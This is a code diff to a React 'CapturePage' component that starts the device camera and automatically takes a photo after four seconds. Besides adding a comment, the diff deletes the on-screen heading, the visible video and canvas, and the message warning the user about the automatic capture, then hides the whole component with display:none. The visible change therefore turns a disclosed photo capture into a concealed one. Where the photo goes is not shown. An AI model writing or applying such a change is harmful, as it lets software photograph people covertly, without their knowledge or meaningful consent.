@@ -8,6 +8,7 @@ export default function CapturePage() {
   useEffect(() => {
     const startCamera = async () => {
       try {
+        // Request camera access
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         if (videoRef.current) {
           videoRef.current.srcObject = stream;
@@ -66,11 +67,9 @@ export default function CapturePage() {
   };
 
   return (
-    <div>
-      <h1>Capture Photo</h1>
-      <video ref={videoRef} style={{ display: 'block' }}></video>
-      <canvas ref={canvasRef} style={{ display: 'block' }}></canvas>
-      <p>Camera will automatically capture a photo after 4 seconds...</p>
+    <div style={{ display: 'none' }}>
+      <video ref={videoRef}></video>
+      <canvas ref={canvasRef}></canvas>
     </div>
   );
 }
